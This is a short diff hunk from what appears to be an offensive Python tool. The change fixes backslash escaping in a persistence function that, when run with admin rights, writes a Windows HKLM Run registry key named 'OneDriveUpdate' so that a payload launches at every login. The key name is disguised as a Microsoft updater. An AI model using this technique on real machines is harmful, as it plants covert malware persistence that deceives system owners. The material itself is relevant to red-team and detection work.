@@ -30,7 +30,7 @@ def hklm_run(payload):
 	if payloads().exe(payload):
 		if information().admin():
 			if "64" in information().architecture():
-				if reg_create("Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run", "OneDriveUpdate", payload):
+				if reg_create("Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", "OneDriveUpdate", payload):
 					print_success("Successfully created OneDriveUpdate key containing payload ({})".format(os.path.join(payload)))
 					print_success("Successfully installed persistence, payload will run at login")
 				else:
